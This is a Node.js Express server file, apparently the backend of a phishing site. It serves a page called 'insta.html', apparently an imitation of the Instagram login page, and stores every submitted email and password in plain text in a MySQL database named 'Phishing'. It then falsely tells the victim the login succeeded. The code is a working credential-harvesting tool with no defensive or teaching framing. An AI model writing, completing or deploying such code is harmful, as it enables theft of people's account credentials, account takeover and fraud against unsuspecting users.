const express = require('express');
const mysql = require('mysql');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

const db = mysql.createConnection({
    host: '127.0.0.1',
    user: 'root',
    password: 'password',
    database: 'Phishing'
});

db.connect(err => {
    if (err) {
        console.error('Error connecting to db:', err);
        return;
    }
    console.log('Connected to db');
});

// Route for serving the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'insta.html'));
});

// Login route
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Insert user into MySQL database
    db.query('INSERT INTO User (email, password) VALUES (?, ?)', [email, password], (err, result) => {
        if (err) {
            console.error('Error inserting user:', err);
            res.status(500).send('Failed to login user');
            return;
        }
        console.log('User login successfully');
        res.status(200).send('User login successfully');
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
